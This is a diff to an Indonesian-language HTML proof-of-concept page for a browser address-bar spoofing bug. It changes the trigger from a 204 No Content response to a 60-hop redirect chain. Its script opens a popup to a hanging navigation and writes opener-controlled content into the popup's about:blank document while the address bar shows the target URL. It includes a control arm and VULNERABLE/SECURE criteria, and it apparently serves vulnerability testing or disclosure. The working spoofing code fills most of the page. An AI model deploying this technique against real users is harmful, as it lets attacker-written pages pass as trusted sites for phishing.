@@ -1,6 +1,6 @@
-<!-- MEKANISME: navigasi popup ke endpoint 204 No Content dibatalkan tanpa dokumen; opener menulis ke about:blank yang tersisa selagi address bar sudah melukis URL target. -->
+<!-- MEKANISME: rantai redirect yang melampaui batas hop membuat navigasi menggantung; opener menulis ke about:blank popup selagi address bar melukis URL awal rantai. -->
 <meta charset="utf-8">
-<title>2 - Hang via 204 No Content (Knob A)</title>
+<title>3 - Hang via rantai redirect tak berujung (Knob A)</title>
 <style>
 body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;margin:24px;max-width:780px;color:#111}
 code{background:#eee;padding:2px 5px;border-radius:3px;word-break:break-all}
@@ -10,25 +10,26 @@ button{font:15px inherit;padding:10px 14px;margin:6px 8px 6px 0;cursor:pointer}
 #log{min-height:1.6em;font-weight:600}
 </style>
 
-<h2>2 &mdash; Hang via 204 No Content (Knob A)</h2>
+<h2>3 &mdash; Hang via rantai redirect tak berujung (Knob A)</h2>
 
 <p>URL asli halaman ini: <code id="here"></code></p>
 
 <div class="box">
-<p><b>Mekanisme:</b> server membalas <code>204 No Content</code>, jadi navigasi <i>dibatalkan</i> dan tidak pernah ada dokumen yang commit. Popup tetap memegang <code>about:blank</code> milik opener, dan opener menulis isinya.</p>
+<p><b>Mekanisme:</b> rantai 60 hop redirect, jauh di atas batas ~20 hop browser. Navigasi tetap <i>pending</i> selama seluruh rantai (hop x RTT) dan berakhir di halaman error, bukan commit. Selama itu <code>about:blank</code> awal popup masih milik opener.</p>
 <p class="v"><b>VULNERABLE:</b> address bar popup menampilkan <code id="t1"></code> padahal badan halaman melaporkan <code>location.href</code> aslinya <code>about:blank</code>.</p>
-<p class="s"><b>SECURE:</b> setelah 204 diterima, address bar popup menampilkan <code>about:blank</code> / kosong &mdash; URL yang tidak menghasilkan dokumen tidak boleh diatribusikan ke isi jendela.</p>
+<p class="s"><b>SECURE:</b> address bar popup menampilkan <code>about:blank</code> selama rantai berjalan, lalu halaman error redirect &mdash; URL rantai tidak pernah diatribusikan ke dokumen tulisan opener.</p>
+<p><b>Catatan jaringan:</b> bila host di bawah sedang mati, ganti konstanta <code>HANG</code>/<code>GOOD</code> ke <code>https://httpbingo.org/redirect/60</code> atau <code>https://nghttp2.org/httpbin/redirect/60</code> (jalur kode tidak berubah).</p>
 </div>
 
-<button id="run">Jalankan mekanisme (endpoint 204)</button>
-<button id="ctrl">Lengan KONTROL (endpoint 200 yang commit)</button>
+<button id="run">Jalankan mekanisme (rantai 60 hop)</button>
+<button id="ctrl">Lengan KONTROL (rantai 1 hop, commit)</button>
 
 <p id="log"></p>
-<p>Satu-satunya beda antara dua tombol adalah status respons (204 vs 200); jalur kode identik.</p>
+<p>Satu-satunya variabel yang berubah antara dua tombol adalah panjang rantai redirect.</p>
 
 <script>
-var HANG = 'https://www.google.com/generate_204';
-var GOOD = 'https://www.google.com/robots.txt';
+var HANG = 'https://httpbin.org/redirect/60';
+var GOOD = 'https://httpbin.org/redirect/1';
 document.getElementById('here').textContent = location.href;
 document.getElementById('t1').textContent = HANG;
 function log(m){ document.getElementById('log').textContent = m; }
@@ -44,11 +45,11 @@ function paint(w, label){
       + '<p>Bandingkan dengan address bar jendela ini.</p>'
       + '<script>setInterval(function(){document.getElementById("u").textContent=location.href},300)<\/script>');
     w.document.close();
-    log('Dokumen ditulis. Screenshot address bar popup + badan popup.');
+    log('Dokumen ditulis. Screenshot address bar popup + badan popup sebelum halaman error muncul.');
   }catch(e){ log('Tulis DITOLAK (dokumen sudah commit ke origin lain) = perilaku SECURE.'); }
 }
 function go(url,label){ var w = window.open(url,'_blank','width=780,height=460');
   setTimeout(function(){ paint(w,label); }, 60); }
-document.getElementById('run').onclick  = function(){ go(HANG,'lengan UJI - respons 204 No Content'); };
-document.getElementById('ctrl').onclick = function(){ go(GOOD,'lengan KONTROL - respons 200 OK'); };
+document.getElementById('run').onclick  = function(){ go(HANG,'lengan UJI - rantai 60 hop'); };
+document.getElementById('ctrl').onclick = function(){ go(GOOD,'lengan KONTROL - rantai 1 hop'); };
 </script>
